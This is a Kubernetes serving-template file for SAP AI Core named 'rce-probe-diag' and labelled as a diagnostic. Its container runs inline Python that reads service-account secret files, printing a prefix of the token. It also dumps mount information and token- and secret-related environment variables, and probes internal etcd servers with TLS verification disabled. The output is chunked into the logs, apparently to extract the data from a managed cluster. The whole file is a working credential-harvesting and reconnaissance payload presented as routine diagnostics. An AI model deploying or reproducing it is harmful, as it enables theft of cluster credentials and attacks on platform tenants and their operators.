apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe-diag
  labels:
    scenarios.ai.sap.com/id: "rce-probe-diag"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe-diag"
    executables.ai.sap.com/description: "sa-token-diag-altpath-mountinfo"
    executables.ai.sap.com/name: "rce-probe-diag"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        volumes:
        - name: kube-api-access
          projected:
            defaultMode: 420
            sources:
            - serviceAccountToken:
                expirationSeconds: 3600
                path: token
                audience: kubernetes
            - configMap:
                items:
                - key: ca.crt
                  path: ca.crt
                name: kube-root-ca.crt
            - downwardAPI:
                items:
                - fieldRef:
                    apiVersion: v1
                    fieldPath: metadata.namespace
                  path: namespace
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          volumeMounts:
          - mountPath: /tmp/sa-diag
            name: kube-api-access
            readOnly: true
          args:
          - |
            python3 -c "
            import os, socket, ssl, json, select, struct

            print('[PROBE_V417_START]', flush=True)

            def emit(label, data):
                flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
                for i in range(0, max(1, len(flat)), 4000):
                    print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)

            # ── 1. Check alternative mount path /tmp/sa-diag ─────────────────────
            for path in [
                '/tmp/sa-diag',
                '/var/run/secrets/kubernetes.io/serviceaccount',
                '/var/run/secrets/kubernetes.io',
                '/var/run/secrets',
                '/run/secrets',
            ]:
                try:
                    contents = os.listdir(path)
                    emit(f'DIR_{path.replace(\"/\",\"_\")}', str(contents))
                    for f in contents:
                        try:
                            with open(f'{path}/{f}') as fh:
                                d = fh.read(400)
                            label = f'{path.replace(\"/\",\"_\")}_{f.replace(\".\",\"_\")}'
                            emit(f'FILE_{label}', d if f != 'token' else f'len={len(d)} pre={d[:60]}')
                        except Exception as e2:
                            emit(f'FILE_ERR_{path.replace(\"/\",\"_\")}_{f}', str(e2))
                except Exception as e:
                    emit(f'DIR_MISS_{path.replace(\"/\",\"_\")}', str(e))

            # ── 2. /proc/self/mountinfo ───────────────────────────────────────────
            try:
                with open('/proc/self/mountinfo') as f:
                    emit('MOUNTINFO', f.read())
            except Exception as e:
                emit('MOUNTINFO_ERR', str(e))

            # ── 3. Environment variables (K8s-related) ────────────────────────────
            relevant_env = {k: v for k, v in os.environ.items()
                            if any(x in k.upper() for x in
                                   ['TOKEN','SECRET','KUBE','K8S','SA_','SERVICE_ACCOUNT'])}
            emit('ENV_K8S', str(relevant_env))

            # ── 4. Etcd TLS (for comparison with v4.14.0) ────────────────────────
            for sip in ['10.250.0.1','10.250.0.2','10.250.0.3']:
                try:
                    s = socket.socket(); s.settimeout(10)
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=sip)
                    s.connect((sip, 2379))
                    s.sendall(b'GET /health HTTP/1.1\r\nHost: ' + sip.encode() + b':2379\r\nConnection: close\r\n\r\n')
                    resp = b''
                    while True:
                        c = s.recv(4096)
                        if not c: break
                        resp += c
                    s.close()
                    emit(f'ETCD_TLS_{sip}', resp[:300].decode(errors='replace'))
                except Exception as e:
                    emit(f'ETCD_TLS_ERR_{sip}', str(e))

            print('[PROBE_V417_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
